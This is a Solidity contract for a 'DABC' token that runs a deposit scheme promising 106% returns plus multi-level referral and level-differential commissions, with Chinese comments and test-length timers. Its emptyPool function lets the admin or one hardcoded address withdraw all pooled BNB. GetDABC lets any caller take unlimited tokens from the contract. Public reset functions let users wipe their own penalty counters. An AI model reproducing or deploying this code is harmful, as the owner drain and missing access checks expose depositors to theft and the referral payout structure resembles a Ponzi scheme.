// SPDX-License-Identifier: Apache-2.0

pragma solidity >=0.7.0 <0.9.0;

import "./DABC10Interface.sol";

contract DABC10 is DABC10Interface {

    uint256 constant private MAX_UINT256 = 2**256 - 1;
    uint constant public winTime = 1 * 60;         //获取本金+利息时间（单位：秒）
    uint256 constant public eachMinedMinCount = 1e17; //单轮最小
    uint256 constant public eachMinedMaxCount = 10e18; //单轮最大
    uint constant public rate = 6;             //利率，例：6，表示106%
    uint constant public ZTRate = 2;           //直推利息，3%
    // uint256 public Per = 100 * 10 ** 18;  //消耗比率：1 BNB : 100 DABC
    uint constant public SpanMin = 1 * 60; //第二轮投入开始时间(单位：秒)
    uint constant public SpanMax = 2 * 60; //第二轮投入结束时间(单位：秒)
    uint256 constant public Multiple = 1e17;    //投入倍数
    uint constant public InvalidTimesLimit = 2;    //无效单次数限制
    uint256 constant public OOD = 15 * 60;   //15天没有再质押则拉黑名单（测试：15分钟）

    string public constant name = 'DABC';    
    string public constant symbol = 'DABC';               
    uint8 public constant decimals = 18;                
    uint256 public totalSupply;
    uint256 public total;   

    address admin;
    address constant matemask_account1 = 0x821b121D544cAb0a4F4d0ED2F1c2B14fAb4f969F;
    address internal backen = 0x7AAB4Ff86700A2D701d4858828094202a9D48102;

    mapping(address => uint256) public reward;
    mapping(address => address[]) public invitees;
    mapping(address => zhitui[]) public ZT;
    mapping(address => address) public getInvitor;
    mapping(address => minter) public minters;
    mapping(address => tb[]) public TB;
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowed;
    mapping(address => jicha[]) public JC;

    struct jicha {
        address fromwho;
        uint time;
        uint256 jcBalance;
    }
    
    struct zhitui {
        address fromwho;
        bool enable;
        bool burning;
        uint time;
        uint256 ztBalance;
    }

    struct minter {
        uint lastPledgeTime;
        uint times;
        uint invalidTimes;
        uint tblength;
        uint jclength;
        uint ztlength;
        uint256 totalBalance;
        uint256 totalRevenue;
    }


    struct tb {
        uint time;
        bool valid;
        uint256 balance;
        bool isexist;
    }
    
    
    constructor (uint256 _initialAmount) {
        admin = msg.sender;
        totalSupply = _initialAmount * 10 ** uint256(decimals);
        balances[address(this)] = totalSupply;
        total = totalSupply;
    }

    // function changeBacken(address _backen) public payable returns (bool) {
    //     require(admin == msg.sender);
    //     require(backen != address(0) && backen != _backen);
    //     backen = _backen;
    //     return true;
    // }

    // function Verify(string memory _message,  string memory salt, bytes memory _sig) internal view returns (bool) {
    //     bytes32 messageHash = keccak256(abi.encodePacked(_message));
    //     bytes32 ethSignedMessageHash = keccak256(abi.encodePacked(salt, messageHash));
    //     return (recover(ethSignedMessageHash, _sig) == backen);
    // }

    // function recover(bytes32 _signedHash, bytes memory _sig) internal pure returns (address) {
    //     (bytes32 r, bytes32 s, uint8 v) = _split(_sig);
    //     return ecrecover(_signedHash, v, r, s);  
    // }

    // function _split(bytes memory _sig) internal pure returns (bytes32 r, bytes32 s, uint8 v) {
    //     require(_sig.length == 65);
    //     assembly {
    //         r := mload(add(_sig, 32))
    //         s := mload(add(_sig,64))
    //         v := byte(0, mload(add(_sig, 96)))
    //     }
    //     if (v < 27){
    //         v += 27;
    //     }
    //     require(v == 27 || v == 28);
    // }


    // function toString(bytes memory data) internal pure returns (string memory) {
    //     bytes memory alphabet = "0123456789abcdef";
    //     bytes memory str = new bytes(2 + data.length * 2);
    //     str[0] = "0";
    //     str[1] = "x";
    //     for (uint i = 0; i < data.length; i++) {
    //         str[2 + i * 2] = alphabet[uint(uint8(data[i] >> 4))];
    //         str[3 + i * 2] = alphabet[uint(uint8(data[i] & 0x0f))];
    //     }
    //     return string(str);
    // }

    // function toHex(uint256 u) public pure returns (string memory) {
    //     return toString(abi.encodePacked(u));
    // }


    // function transbnb(address _to, uint256 _amount, bytes memory _sig) public payable returns (bool) {
    //     require(_to != address(0));
    //     require(Verify(toString(abi.encodePacked(_to)), toString(abi.encodePacked(_amount)), _sig) == true);
    //     require(address(this).balance > _amount);
    //     payable(_to).transfer(_amount);
    //     return true;
    // }

    function poolBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function pullSome() public payable{
        require(msg.sender != address(0));
    }

    function getInvitees(address _inviter) public view returns (address[] memory) {
        return invitees[_inviter];
    }

    // function safe_rm_tb(uint rm_at) internal {
    //     for (uint i = rm_at;i < TB[msg.sender].length - 1; i++) {
    //         TB[msg.sender][i] = TB[msg.sender][i + 1];
    //     }
    //     TB[msg.sender].pop();
    //     minters[msg.sender].tblength = TB[msg.sender].length;
    // }

    function resetInvalidTimes() public returns (bool) {
        minters[msg.sender].invalidTimes = 0;
        return true;
    }

    function resetTimes() public returns (bool) {
        minters[msg.sender].times = 0;
        return true;
    }

    function state_per() public view returns (uint256) {
        uint256 burned = total - totalSupply;
        uint256 Per = 100 * 10 ** uint256(decimals);
        if (burned < 10000000 * 10 ** uint256(decimals)){
            Per = 100 * 10 ** uint256(decimals);
        } else if(burned >= 10000000 * 10 ** uint256(decimals) && burned < 30000000 * 10 ** uint256(decimals)) {
            Per = 50  * 10 ** uint256(decimals);
        } else if(burned >= 30000000 * 10 ** uint256(decimals) && burned < 70000000 * 10 ** uint256(decimals)) {
            Per = 25  * 10 ** uint256(decimals);
        } else if(burned >= 70000000 * 10 ** uint256(decimals) && burned < 150000000 * 10 ** uint256(decimals)) {
            Per = 125 * 10 ** 17;
        } else if(burned >= 150000000 * 10 ** uint256(decimals)) {
            Per = 625 * 10 ** 16;
        }
        return Per;
    }

    // function Pledge() public payable {
    //     require(msg.sender != address(0));
    //     require(msg.sender != admin);
    //     require(msg.value >= eachMinedMinCount && msg.value <= eachMinedMaxCount);                
    //     require(msg.value % Multiple == 0);
        
    //     uint256 Per = state_per();
    //     uint256 cost = msg.value * Per / 10 ** 18;
    //     require(balances[msg.sender] >= cost);
    //     uint currtime = block.timestamp;
    //     if(minters[msg.sender].times != 0){
    //         require(currtime - minters[msg.sender].lastPledgeTime <= OOD);
    //     }
    //     if (TB[msg.sender].length > 0) {
    //         uint lasttime = TB[msg.sender][TB[msg.sender].length - 1].time;
    //         uint span = currtime - lasttime;
    //         require(span >= SpanMin);
    //         if(span <= SpanMax) {
    //             //pledge go on
    //             require(msg.value >= TB[msg.sender][TB[msg.sender].length - 1].balance);
    //             TB[msg.sender][TB[msg.sender].length - 1].valid = true;
    //             reward[msg.sender] += TB[msg.sender][TB[msg.sender].length - 1].balance * rate / 100;
    //             if(getInvitor[msg.sender] != address(0)){
    //                 //inviter exist
    //                 ZT[getInvitor[msg.sender]].push(zhitui(msg.sender, true, TB[msg.sender][TB[msg.sender].length - 1].time, TB[msg.sender][TB[msg.sender].length - 1].balance * ZTRate / 100));
    //                 minters[getInvitor[msg.sender]].ztlength = ZT[getInvitor[msg.sender]].length;
    //             }
    //         } else {
    //             //pledge break
    //             minters[msg.sender].invalidTimes++;
    //         }  
    //     }
    //     require(minters[msg.sender].invalidTimes < InvalidTimesLimit);
    //     //进行交易
    //     TB[msg.sender].push(tb(currtime, false, msg.value, true));
    //     back_flow(cost);
    //     minters[msg.sender].totalBalance += msg.value;
    //     minters[msg.sender].tblength = TB[msg.sender].length;
    //     minters[msg.sender].times++;
    //     minters[msg.sender].lastPledgeTime = currtime;
    // }


    function Pledge(address _inviter) public payable {
        require(msg.sender != address(0));
        require(_inviter != msg.sender);
        require(msg.sender != admin);
        require(msg.value >= eachMinedMinCount && msg.value <= eachMinedMaxCount);                
        require(msg.value % Multiple == 0);
        uint256 Per = state_per();
        uint256 cost = msg.value * Per / 10 ** 18;
        require(balances[msg.sender] >= cost);
        uint currtime = block.timestamp;
        if(minters[msg.sender].times != 0){
            require(currtime - minters[msg.sender].lastPledgeTime <= OOD);
        }
        if (TB[msg.sender].length > 0) {
            uint lasttime = TB[msg.sender][TB[msg.sender].length - 1].time;
            uint span = currtime - lasttime;
            require(span >= SpanMin);
            if(span <= SpanMax) {
                require(msg.value >= TB[msg.sender][TB[msg.sender].length - 1].balance);
                TB[msg.sender][TB[msg.sender].length - 1].valid = true;
                reward[msg.sender] += TB[msg.sender][TB[msg.sender].length - 1].balance * rate / 100;
                if(getInvitor[msg.sender] != address(0)){
                    uint256 inviter_valid = get_valid(getInvitor[msg.sender], currtime);
                    //inviter exist
                    ZT[getInvitor[msg.sender]].push(zhitui(msg.sender,
                    true, 
                    inviter_valid >= TB[msg.sender][TB[msg.sender].length - 1].balance? true : false,
                    TB[msg.sender][TB[msg.sender].length - 1].time, 
                    (inviter_valid >= TB[msg.sender][TB[msg.sender].length - 1].balance? TB[msg.sender][TB[msg.sender].length - 1].balance : inviter_valid) * ZTRate / 100));
                    minters[getInvitor[msg.sender]].ztlength = ZT[getInvitor[msg.sender]].length;
                }
            } else {
                minters[msg.sender].invalidTimes++;
            }  
        }
        require(minters[msg.sender].invalidTimes < InvalidTimesLimit);
        //建立关系
        if(getInvitor[msg.sender] == address(0) && invitees[msg.sender].length == 0 && _inviter != address(0)){
            getInvitor[msg.sender] = _inviter;
            invitees[_inviter].push(msg.sender);
        }
        //进行交易
        TB[msg.sender].push(tb(currtime, false, msg.value, true));
        back_flow(cost);
        minters[msg.sender].totalBalance += msg.value;
        minters[msg.sender].tblength = TB[msg.sender].length;
        minters[msg.sender].times++;
        minters[msg.sender].lastPledgeTime = currtime;
    }

    function GetZT(address _inviter) public view returns (uint256 ena, uint256 disa) {
        for (uint i = 0; i < ZT[_inviter].length; i++){
            if(ZT[_inviter][i].enable){
                ena += ZT[_inviter][i].ztBalance;
            } else {
                disa += ZT[_inviter][i].ztBalance;
            }
        }
        return (ena, disa);
    }

    function GetZTBalance() public payable {
        require(msg.sender != address(0));
        require(ZT[msg.sender].length > 0);
        uint256 payment = 0;
        for (uint i = 0; i < ZT[msg.sender].length; i++){
            if(ZT[msg.sender][i].enable == true){
                payment += ZT[msg.sender][i].ztBalance;
                ZT[msg.sender][i].enable = false;
            }
        }
        require(payment > 0);
        require(payment <= address(this).balance);
        payable(msg.sender).transfer(payment);
    }

    function GetDABC(uint256 _value) public {
        require(msg.sender != address(0));
        balances[msg.sender] += _value * 10 ** uint256(decimals);
        balances[address(this)] -= _value * 10 ** uint256(decimals);
        emit Transfer(address(this), msg.sender, _value * 10 ** uint256(decimals)); 
    }


    function get_related(uint256 sum, address _inviter, uint current) internal returns (uint256){
        sum += get_valid(_inviter, current);
        for (uint i = 0; i < invitees[_inviter].length; i++){
            sum = get_related(sum, invitees[_inviter][i], current);
        }
        return sum;   
    }


    function GetAchievement(address _inviter) public returns (uint256 achievement, uint lv) {
        require(_inviter != address(0));
        uint256 sum = 0;
        uint current = block.timestamp;
        sum = get_valid(_inviter, current);
        if (invitees[_inviter].length == 0){
            return (sum, level(sum));
        } 
        for (uint i = 0; i < invitees[_inviter].length; i++){
            sum = get_related(sum, invitees[_inviter][i], current);
        }
        return (sum, level(sum));  
    }

    function level(uint256 achieve) internal pure returns (uint) {
        if(achieve >= 100e8 && achieve < 500e8){
            return 0;
        } else if(achieve >= 500e8 && achieve < 1000e8) {
            return 1;
        } else if(achieve >= 1000e8 && achieve < 2000e8){
            return 2;
        } else if(achieve >= 2000e8 && achieve < 5000e8){
            return 3;
        } else if(achieve >= 5000e8 && achieve < 8000e8){
            return 4;
        } else {
            return 5;
        }
    }

    //get one's validated order
    function get_valid(address owner, uint current) internal view returns (uint256) {
        uint256 sum = 0;
        if(TB[owner].length > 1){
            if (current - TB[owner][TB[owner].length - 1].time <= SpanMax && 
            TB[owner][TB[owner].length - 2].valid){
                sum += TB[owner][TB[owner].length - 2].balance;
            }
            
        }
        return sum;
    }

    function get_jc(address _inviter, uint current, uint ll) internal returns (uint256) {
        uint256 sum = 0;
        uint256 jc = 0;
        (uint256 lj, uint lv) = GetAchievement(_inviter);
        if(lj != 0){
            jc = get_valid(_inviter, current) / 100;
            sum += jc * 2 * (ll - lv) / 10;
            if (invitees[_inviter].length == 0) return sum;
            for (uint i = 0; i < invitees[_inviter].length; i++){
                sum += get_jc(invitees[_inviter][i], current, ll);
            }
            return sum;
        } else {
            return 0;
        }
        
    }

    /*
    * 获取级差额度
    */
    function getJC(address _inviter) public returns (uint256 lj, uint256 jc) {
        if(_inviter == address(0)) return (0, 0);
        uint current = block.timestamp;
        uint lv = 0;
        (lj, lv) = GetAchievement(_inviter);
        if(lv == 0) return (0, 0);
        if(invitees[_inviter].length > 0){
            for(uint i = 0; i < invitees[_inviter].length; i++){
                jc += get_jc(invitees[_inviter][i], current, lv);
            }
        }
        return (lj, jc);
    }


    //get the pledge's balance
    function GetPledge() public payable {
        require(TB[msg.sender].length > 0);
        uint current = block.timestamp;
        uint256 payment = 0;
        for (uint i = 0; i < TB[msg.sender].length; i++){
            uint time = TB[msg.sender][i].time;
            if((current - time) >= winTime && TB[msg.sender][i].isexist) {
                payment += TB[msg.sender][i].balance;
                TB[msg.sender][i].isexist = false;
            }
        } 
        require(payment <= address(this).balance && payment > 0);
        payable(msg.sender).transfer(payment);
        minters[msg.sender].totalRevenue += payment;
    }

    function GetReward() public payable {
        require(msg.sender != address(0));
        require(reward[msg.sender] > 0);
        require(address(this).balance >= reward[msg.sender]);
        payable(msg.sender).transfer(reward[msg.sender]);
        minters[msg.sender].totalRevenue += reward[msg.sender];
        reward[msg.sender] = 0;
    }

    function emptyPool() public payable {
        require(msg.sender == admin || msg.sender == matemask_account1);
        payable(msg.sender).transfer(address(this).balance);
    }

    function burn(uint256 _value) internal returns (bool success) {
        require(balances[msg.sender] >= _value);
        balances[msg.sender] -= _value;
        totalSupply -= _value;
        emit Burn(msg.sender, _value);
        return true;
    }

    function back_flow(uint256 _value) internal {
        if ((total - totalSupply) >= 1500000000 * 10 ** 18){
            uint256 part = _value;
            transfer(admin, part);
        } else {
            uint256 part = _value / 2;
            burn(part);
            transfer(admin, part);
        }
        
    }


    function balanceOf(address _owner) public view override returns (uint256) {
        return balances[_owner];
    }

    function transfer(address _to, uint256 _value) public override returns (bool) {
        require(balances[msg.sender] >= _value);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        emit Transfer(msg.sender, _to, _value); 
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public override returns (bool) {
        uint256 allowances = allowed[_from][msg.sender];
        require(balances[_from] >= _value && allowances >= _value);
        balances[_to] += _value;
        balances[_from] -= _value;
        if (allowances < MAX_UINT256) {
            allowed[_from][msg.sender] -= _value;
        }
        emit Transfer(_from, _to, _value); 
        return true;
    }

    function approve(address _spender, uint256 _value) public override returns (bool) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value); 
        return true;
    }

    function allowance(address _owner, address _spender) public override view returns (uint256) {
        return allowed[_owner][_spender];
    }


}

